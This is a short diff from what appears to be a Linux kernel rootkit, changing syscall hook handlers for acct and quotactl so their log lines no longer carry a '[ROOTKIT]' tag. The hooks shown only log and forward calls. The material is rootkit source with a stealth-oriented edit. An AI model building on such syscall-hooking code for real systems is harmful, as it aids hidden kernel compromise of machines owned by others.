@@ -11,7 +11,7 @@
 // sys_acct syscall hook handler
 SYSCALL_HOOK_HANDLER1(acct, orig_acct, p_regs, const char __user *, s_name)
 {
-    pr_info("[ROOTKIT] acct(%p)\n", s_name);
+    pr_dev_info("acct(%p)\n", s_name);
 
     if (s_name == NULL) {
         return orig_acct(p_regs);
@@ -27,7 +27,7 @@ SYSCALL_HOOK_HANDLER4(quotactl, orig_quotactl, p_regs, unsigned int, ui32_cmd, c
     uint ui32_cmds = ui32_cmd >> SUBCMDSHIFT;
     uint ui32_type = ui32_cmd & SUBCMDMASK;
 
-    pr_info("[ROOTKIT] quotactl(%#x, %p, %u, %p)\n", ui32_cmd, s_special, ui32_id, p_addr);
+    pr_dev_info("quotactl(%#x, %p, %u, %p)\n", ui32_cmd, s_special, ui32_id, p_addr);
 
     if (ui32_type >= MAXQUOTAS) {
         return -EINVAL;
